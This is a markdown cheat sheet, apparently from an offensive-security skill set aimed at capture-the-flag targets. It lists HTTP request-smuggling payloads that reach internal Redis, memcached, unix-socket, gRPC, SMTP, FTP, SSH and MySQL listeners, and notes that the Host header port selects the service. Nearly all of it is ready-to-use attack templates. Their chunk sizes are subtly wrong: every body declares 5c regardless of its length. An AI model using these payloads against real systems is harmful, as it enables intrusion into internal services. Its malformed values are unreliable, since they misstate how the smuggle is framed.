# Protocol crossing — HTTP inside other protocols

## The shape — the smuggle's bytes are another protocol

A desync smuggle lands on the back-end's socket — but the socket may
carry a DIFFERENT protocol than HTTP — the smuggle's bytes are the
other protocol's commands.

## HTTP inside Redis — `SET k v\r\nGET k\r\n`

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
SET k v
GET k

0
```

The smuggle's `SET`/`GET` are Redis commands — the back-end's Redis-
client socket receives them — a protocol-cross — `advanced-reach.md`.

## HTTP inside memcached — `set k 0 0 1\r\nv\r\nget k\r\n`

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
set k 0 0 1
v
get k

0
```

The smuggle's memcached commands — the memcached-socket receives them.

## HTTP inside a unix-socket — `GET / HTTP/1.1` on a .sock

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /flag HTTP/1.1
Host: unix

0
```

The smuggle's request lands on a unix-socket listener — `internal-api.md`.

## HTTP inside gRPC — the protobuf body

```text
POST /internal.Greeter/SayFlag HTTP/1.1
Content-Type: application/grpc
Content-Length: 4

<protobuf bytes>
```

The smuggle's gRPC frame — `skills/web-ssrf/references/protocol-smuggling.md`.

## HTTP inside SMTP — `MAIL FROM:<a>\r\nRCPT TO:<b>`

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
MAIL FROM:<a>
RCPT TO:<b>

0
```

The smuggle's SMTP commands — the mail-socket receives them.

## HTTP inside FTP — `USER a\r\nPASS b\r\nRETR flag`

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
USER a
PASS b
RETR flag

0
```

The smuggle's FTP commands.

## HTTP inside SSH — the SSH-banner

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
SSH-2.0-OpenSSH_8.9

0
```

The smuggle's SSH-banner — the SSH-server's banner-check.

## HTTP inside MySQL — the MySQL-handshake

The smuggle's bytes inside a MySQL-protocol socket — the handshake-packet —
`skills/web-ssrf/references/protocol-smuggling.md`.

## The socket-target — `Host: t:port` selects the protocol

```text
GET / HTTP/1.1
Host: t:6379
```

The `Host:`'s port selects the listener — `6379` = Redis, `11211` =
memcached, `3306` = MySQL — `internal-routes.md`.
